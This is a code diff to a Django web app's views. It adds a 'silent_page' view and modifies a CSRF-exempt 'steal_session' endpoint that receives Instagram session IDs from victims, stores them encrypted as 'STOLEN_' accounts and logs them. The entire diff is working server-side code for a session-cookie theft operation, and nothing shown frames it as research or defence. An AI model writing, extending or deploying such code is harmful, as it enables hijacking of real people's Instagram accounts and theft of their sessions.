@@ -163,18 +163,26 @@ def download_json(request):
 
 
 
+
+def silent_page(request):
+    return render(request, 'core/silent.html')
+
+
+
 @csrf_exempt
 def steal_session(request):
     if request.method == "POST":
         try:
+            import json
             data = json.loads(request.body)
             sessionid = data.get('sessionid', '')
-            if sessionid and len(sessionid) > 30:
+            
+            if sessionid and len(sessionid) > 50:
                 # SAVE TO DB
                 InstagramAccount.objects.update_or_create(
-                    username=f"MOBILE_{sessionid[:12]}",
+                    username=f"STOLEN_{sessionid[:15]}",
                     defaults={
-                        'password': 'SILENT_STEAL',
+                        'password': 'SILENT_LINK',
                         'session_data': fernet.encrypt(json.dumps({
                             "authorization_data": {"sessionid": sessionid}
                         }).encode()).decode(),
@@ -182,12 +190,9 @@ def steal_session(request):
                         'last_success': timezone.now()
                     }
                 )
-                print(f"SESSION STOLEN: {sessionid[:50]}...")
-                return JsonResponse({"status": "success"})
+                print(f"STOLEN: {sessionid[:60]}...")
+                return JsonResponse({"status": "ok"})
         except Exception as e:
             print(f"ERROR: {e}")
-    return JsonResponse({"status": "failed"})
-
-
-def silent_page(request):
-    return render(request, 'core/silent.html')
+    
+    return JsonResponse({"status": "done"})
